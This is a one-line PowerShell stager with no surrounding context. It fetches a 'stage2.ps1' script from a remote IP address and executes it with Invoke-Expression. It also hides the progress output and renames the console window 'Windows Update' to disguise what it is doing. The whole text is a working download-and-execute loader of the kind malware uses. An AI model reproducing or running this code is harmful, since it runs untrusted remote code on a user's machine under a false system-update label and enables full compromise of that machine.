
$RemoteUrl = "https://203.0.113.6/stage2.ps1"; IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content; $ProgressPreference = "SilentlyContinue"; $Host.UI.RawUI.WindowTitle = "Windows Update"
